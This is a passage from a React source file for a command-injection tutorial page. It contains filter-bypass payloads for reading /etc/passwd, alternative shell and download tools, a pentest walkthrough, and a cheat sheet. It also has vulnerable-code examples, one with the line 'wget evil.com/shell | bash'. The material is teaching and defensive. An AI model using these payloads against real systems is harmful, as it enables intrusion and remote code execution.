                </Typography>
                <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", bgcolor: alpha("#000", 0.05), p: 1.5, borderRadius: 1 }}>
                  <code>c'a't /etc/passwd</code> — Quote insertion<br/>
                  <code>c\at /etc/passwd</code> — Backslash split<br/>
                  <code>${"$(echo Y2F0Cg==|base64 -d)"}</code> — Base64<br/>
                  <code>w`echo h`oami</code> — Substitution split<br/>
                  <code>/???/??t /etc/passwd</code> — Glob patterns
                </Box>
              </Box>
            </Grid>
            <Grid item xs={12} md={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2 }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#8b5cf6", mb: 1 }}>
                  Alternative Commands
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.8, mb: 2 }}>
                  If specific commands are blocked, alternatives exist:
                </Typography>
                <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", bgcolor: alpha("#000", 0.05), p: 1.5, borderRadius: 1 }}>
                  Instead of <code>cat</code>: tac, head, tail, less, more, nl, xxd<br/>
                  Instead of <code>ls</code>: dir, find, echo *<br/>
                  Instead of <code>whoami</code>: id, echo $USER<br/>
                  Instead of <code>wget</code>: curl, fetch, lwp-download<br/>
                  Instead of <code>nc</code>: bash -i, python, perl, php
                </Box>
              </Box>
            </Grid>
          </Grid>

          {/* Warning about defense */}
          <Box sx={{ mt: 3, p: 2, bgcolor: alpha("#ef4444", 0.08), borderRadius: 2, border: `1px solid ${alpha("#ef4444", 0.2)}` }}>
            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#ef4444" }}>
              🛡️ Defense Lesson
            </Typography>
            <Typography variant="body2" sx={{ lineHeight: 1.8 }}>
              Every bypass technique above demonstrates why <strong>blocklists are fundamentally flawed</strong>. You cannot enumerate all possible evasion techniques. Instead:
              • Use allowlists that define exactly what's acceptable (e.g., only digits and dots for IPs)
              • Avoid shells entirely by using safe APIs
              • Implement defense in depth with multiple layers
            </Typography>
          </Box>
        </Paper>

        {/* Step-by-Step Attack Walkthrough */}
        <Paper
          id="attack-walkthrough"
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#f59e0b", 0.03),
            border: `1px solid ${alpha("#f59e0b", 0.15)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <TerminalIcon sx={{ color: "#f59e0b" }} /> Step-by-Step Attack Walkthrough
          </Typography>

          {/* Beginner explanation */}
          <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 2, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
            <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
              <strong>Let's walk through a complete penetration test scenario.</strong> This example shows the methodical approach security professionals use to identify, confirm, and demonstrate command injection—without causing damage. Follow along to understand the attacker mindset and testing methodology.
            </Typography>
          </Box>

          <Box component="ol" sx={{ pl: 3, "& li": { mb: 3 } }}>
            <li>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b" }}>
                Step 1: Identify Potential Entry Points
              </Typography>
              <Typography variant="body2" sx={{ lineHeight: 1.8, mt: 1, mb: 1 }}>
                Browse the application looking for features that might execute system commands. A "Server Health" page has a field for checking if hosts are reachable:
              </Typography>
              <Box sx={{ p: 1.5, bgcolor: alpha("#000", 0.05), borderRadius: 1, fontFamily: "monospace", fontSize: "0.8rem" }}>
                URL: /admin/health-check?host=192.168.1.1<br/>
                Response: "Host 192.168.1.1 is reachable (4 packets transmitted, 4 received)"
              </Box>
              <Typography variant="body2" sx={{ mt: 1, color: "text.secondary" }}>
                🔍 This looks like a ping command. The "packets transmitted" text is a giveaway.
              </Typography>
            </li>

            <li>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b" }}>
                Step 2: Test for Injection with Benign Payload
              </Typography>
              <Typography variant="body2" sx={{ lineHeight: 1.8, mt: 1, mb: 1 }}>
                Try appending a semicolon and a safe command that produces visible output:
              </Typography>
              <Box sx={{ p: 1.5, bgcolor: alpha("#000", 0.05), borderRadius: 1, fontFamily: "monospace", fontSize: "0.8rem" }}>
                Input: 192.168.1.1; echo INJECTION_TEST<br/>
                Response: "Host 192.168.1.1 is reachable... INJECTION_TEST"
              </Box>
              <Typography variant="body2" sx={{ mt: 1, color: "#22c55e", fontWeight: 600 }}>
                ✓ CONFIRMED: The echo output appeared! Command injection exists.
              </Typography>
            </li>

            <li>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b" }}>
                Step 3: Identify the Environment
              </Typography>
              <Typography variant="body2" sx={{ lineHeight: 1.8, mt: 1, mb: 1 }}>
                Gather information about the server without causing damage:
              </Typography>
              <Box sx={{ p: 1.5, bgcolor: alpha("#000", 0.05), borderRadius: 1, fontFamily: "monospace", fontSize: "0.8rem" }}>
                ; uname -a → "Linux webserver 5.15.0 #1 SMP x86_64"<br/>
                ; whoami → "www-data"<br/>
                ; pwd → "/var/www/healthcheck"<br/>
                ; id → "uid=33(www-data) gid=33(www-data)"
              </Box>
              <Typography variant="body2" sx={{ mt: 1, color: "text.secondary" }}>
                📋 Now we know: Linux server, running as www-data (web user), in the healthcheck directory.
              </Typography>
            </li>

            <li>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b" }}>
                Step 4: Demonstrate Impact (Proof of Concept)
              </Typography>
              <Typography variant="body2" sx={{ lineHeight: 1.8, mt: 1, mb: 1 }}>
                Show what an attacker <em>could</em> access without actually exfiltrating sensitive data:
              </Typography>
              <Box sx={{ p: 1.5, bgcolor: alpha("#000", 0.05), borderRadius: 1, fontFamily: "monospace", fontSize: "0.8rem" }}>
                ; head -5 /etc/passwd → Shows first 5 lines (users exist)<br/>
                ; ls -la /var/www/ → Directory structure visible<br/>
                ; cat /proc/version → Kernel version for privilege escalation research
              </Box>
              <Typography variant="body2" sx={{ mt: 1, color: "text.secondary" }}>
                📝 Document findings with screenshots. Don't read actual sensitive data unless authorized.
              </Typography>
            </li>

            <li>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b" }}>
                Step 5: Report with Remediation
              </Typography>
              <Typography variant="body2" sx={{ lineHeight: 1.8, mt: 1 }}>
                Write a clear report including:
              </Typography>
              <Box component="ul" sx={{ pl: 2, mt: 1 }}>
                <li><Typography variant="body2">Vulnerability location: <code>/admin/health-check?host=</code></Typography></li>
                <li><Typography variant="body2">Proof of concept: <code>192.168.1.1; echo TEST</code></Typography></li>
                <li><Typography variant="body2">Impact: Remote code execution as www-data</Typography></li>
                <li><Typography variant="body2">Recommendation: Use subprocess with array arguments, validate IP format</Typography></li>
              </Box>
            </li>
          </Box>
        </Paper>

        {/* Tip */}
        <Paper
          sx={{
            p: 2,
            mb: 4,
            borderRadius: 2,
            bgcolor: alpha("#f59e0b", 0.05),
            border: `1px solid ${alpha("#f59e0b", 0.2)}`,
            display: "flex",
            alignItems: "center",
            gap: 2,
          }}
        >
          <TipsAndUpdatesIcon sx={{ color: "#f59e0b" }} />
          <Typography variant="body2">
            <strong>Testing Tip:</strong> Try <code>; sleep 10</code> or <code>| ping -c 10 127.0.0.1</code> to detect blind injection via time delays.
          </Typography>
        </Paper>

        {/* Quick Reference Cheat Sheet */}
        <Paper
          id="cheat-sheet"
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#6366f1", 0.03),
            border: `1px solid ${alpha("#6366f1", 0.15)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <CodeIcon sx={{ color: "#6366f1" }} /> Quick Reference Cheat Sheet
          </Typography>

          <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 2, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
            <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
              <strong>Bookmark this section!</strong> A quick reference of metacharacters, payloads, and prevention techniques all in one place.
            </Typography>
          </Box>

          <Grid container spacing={2}>
            <Grid item xs={12} md={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#ef4444", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ef4444", mb: 1 }}>
                  Metacharacters Reference
                </Typography>
                <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", lineHeight: 2.2 }}>
                  <code>;</code> — Command separator (Linux)<br/>
                  <code>&amp;</code> — Command separator (Windows)<br/>
                  <code>|</code> — Pipe output<br/>
                  <code>&amp;&amp;</code> — Run if previous succeeds<br/>
                  <code>||</code> — Run if previous fails<br/>
                  <code>`cmd`</code> — Command substitution<br/>
                  <code>$(cmd)</code> — Modern substitution<br/>
                  <code>%0a</code> — URL-encoded newline
                </Box>
              </Box>
            </Grid>
            <Grid item xs={12} md={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b", mb: 1 }}>
                  Detection Payloads
                </Typography>
                <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", lineHeight: 2.2 }}>
                  <strong>Time-Based:</strong><br/>
                  <code>; sleep 10</code> — Unix<br/>
                  <code>&amp; timeout 10</code> — Windows<br/><br/>
                  <strong>Output-Based:</strong><br/>
                  <code>; id</code> — Show user<br/>
                  <code>; echo TEST</code> — Echo marker<br/>
                  <code>$(whoami)</code> — Inline
                </Box>
              </Box>
            </Grid>
            <Grid item xs={12} md={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#10b981", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#10b981", mb: 1 }}>
                  Safe Functions
                </Typography>
                <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", lineHeight: 2.2 }}>
                  <strong>Python:</strong> subprocess.run([...], shell=False)<br/>
                  <strong>Node:</strong> spawn("cmd", [args])<br/>
                  <strong>Java:</strong> ProcessBuilder(list)<br/>
                  <strong>PHP:</strong> escapeshellarg()
                </Box>
              </Box>
            </Grid>
            <Grid item xs={12} md={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#ef4444", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ef4444", mb: 1 }}>
                  Dangerous Functions
                </Typography>
                <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", lineHeight: 2.2 }}>
                  <strong>Python:</strong> os.system(), shell=True<br/>
                  <strong>Node:</strong> exec(), execSync()<br/>
                  <strong>PHP:</strong> exec(), system(), passthru()<br/>
                  <strong>Java:</strong> Runtime.exec(String)
                </Box>
              </Box>
            </Grid>
          </Grid>
        </Paper>

        {/* Testing Methodology */}
        <Paper
          id="methodology"
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#8b5cf6", 0.03),
            border: `1px solid ${alpha("#8b5cf6", 0.15)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <BugReportIcon sx={{ color: "#8b5cf6" }} /> Penetration Testing Methodology
          </Typography>

          <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 2, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
            <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
              <strong>A systematic approach to finding command injection.</strong> Always get proper authorization before testing!
            </Typography>
          </Box>

          <Grid container spacing={2}>
            <Grid item xs={12} md={4}>
              <Box sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#8b5cf6", mb: 1 }}>
                  1. Reconnaissance
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.8 }}>
                  • Map all user inputs<br/>
                  • Find file operations<br/>
                  • Identify network utilities<br/>
                  • Check admin panels<br/>
                  • Review API parameters
                </Typography>
              </Box>
            </Grid>
            <Grid item xs={12} md={4}>
              <Box sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#8b5cf6", mb: 1 }}>
                  2. Detection
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.8 }}>
                  • Try <code>; echo test</code><br/>
                  • Use time delays<br/>
                  • Set up callback server<br/>
                  • Watch for errors<br/>
                  • Test URL encoding
                </Typography>
              </Box>
            </Grid>
            <Grid item xs={12} md={4}>
              <Box sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#8b5cf6", mb: 1 }}>
                  3. Report
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.8 }}>
                  • Capture whoami output<br/>
                  • Read non-sensitive files<br/>
                  • Document PoC steps<br/>
                  • Assess severity<br/>
                  • Suggest remediations
                </Typography>
              </Box>
            </Grid>
          </Grid>
        </Paper>

        {/* Common Scenarios */}
        <Paper
          id="scenarios"
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#0ea5e9", 0.03),
            border: `1px solid ${alpha("#0ea5e9", 0.15)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <TerminalIcon sx={{ color: "#0ea5e9" }} /> Common Vulnerable Scenarios
          </Typography>

          <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 2, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
            <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
              <strong>Typical features where command injection hides</strong>, with vulnerable code patterns and safe fixes.
            </Typography>
          </Box>

          <Grid container spacing={2}>
            <Grid item xs={12}>
              <Box sx={{ p: 2, bgcolor: alpha("#0ea5e9", 0.05), borderRadius: 2, mb: 2 }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#0ea5e9", mb: 1 }}>
                  Network Diagnostics (Ping)
                </Typography>
                <Typography variant="body2" sx={{ mb: 1 }}>
                  <strong>Vulnerable:</strong> <code>os.system(f"ping -c 4 {"{host}"}")</code>
                </Typography>
                <Typography variant="body2" sx={{ mb: 1 }}>
                  <strong>Attack:</strong> <code>127.0.0.1; cat /etc/passwd</code>
                </Typography>
                <Typography variant="body2" sx={{ color: "#10b981" }}>
                  <strong>Fix:</strong> <code>subprocess.run(["ping", "-c", "4", host])</code>
                </Typography>
              </Box>
            </Grid>
            <Grid item xs={12}>
              <Box sx={{ p: 2, bgcolor: alpha("#0ea5e9", 0.05), borderRadius: 2, mb: 2 }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#0ea5e9", mb: 1 }}>
                  File Processing (Archive)
                </Typography>
                <Typography variant="body2" sx={{ mb: 1 }}>
                  <strong>Vulnerable:</strong> <code>os.system(f"tar -cf backup.tar {"{path}"}")</code>
                </Typography>
                <Typography variant="body2" sx={{ mb: 1 }}>
                  <strong>Attack:</strong> <code>file; wget evil.com/shell | bash</code>
                </Typography>
                <Typography variant="body2" sx={{ color: "#10b981" }}>
                  <strong>Fix:</strong> Use Python's tarfile library directly
                </Typography>
              </Box>
            </Grid>
            <Grid item xs={12}>
              <Box sx={{ p: 2, bgcolor: alpha("#0ea5e9", 0.05), borderRadius: 2 }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#0ea5e9", mb: 1 }}>
                  Image Processing (ImageMagick)
                </Typography>
                <Typography variant="body2" sx={{ mb: 1 }}>
                  <strong>Vulnerable:</strong> <code>os.system(f"convert {"{file}"} -resize 100x100")</code>
                </Typography>
                <Typography variant="body2" sx={{ mb: 1 }}>
                  <strong>Attack:</strong> <code>'"|id &gt; /tmp/pwned"'</code>
                </Typography>
                <Typography variant="body2" sx={{ color: "#10b981" }}>
                  <strong>Fix:</strong> Use PIL/Pillow library for image operations
                </Typography>
              </Box>
            </Grid>
          </Grid>
        </Paper>

        {/* Related */}
        <Paper sx={{ p: 3, mb: 4, borderRadius: 3, bgcolor: alpha(theme.palette.primary.main, 0.03) }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>?? Related Learning</Typography>
          <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
            <Chip label="SQL Injection " clickable onClick={() => navigate("/learn/sql-injection")} sx={{ fontWeight: 600 }} />
            <Chip label="SSRF Guide " clickable onClick={() => navigate("/learn/ssrf")} sx={{ fontWeight: 600 }} />
            <Chip label="OWASP Top 10 " clickable onClick={() => navigate("/learn/owasp")} sx={{ fontWeight: 600 }} />
          </Box>
        </Paper>

        {/* Quiz Section */}
        <Paper
          id="quiz-section"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            border: `1px solid ${alpha(ACCENT_COLOR, 0.2)}`,
            bgcolor: alpha(ACCENT_COLOR, 0.03),
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <QuizIcon sx={{ color: ACCENT_COLOR }} />
            Knowledge Check
          </Typography>
          <QuizSection
            questions={quizQuestions}
            accentColor={ACCENT_COLOR}
            title="Command Injection Knowledge Check"
            description="Random 10-question quiz drawn from a 75-question bank each time you start the quiz."
            questionsPerQuiz={QUIZ_QUESTION_COUNT}
          />
        </Paper>

        {/* Bottom Navigation */}
        <Box sx={{ mt: 4, textAlign: "center" }}>
          <Button
            variant="outlined"
            startIcon={<ArrowBackIcon />}
            onClick={() => navigate("/learn")}
            sx={{ borderColor: "#8b5cf6", color: "#8b5cf6" }}
          >
            Back to Learning Hub
          </Button>
        </Box>

        </Box>
      </Box>
    </LearnPageLayout>
  );
}

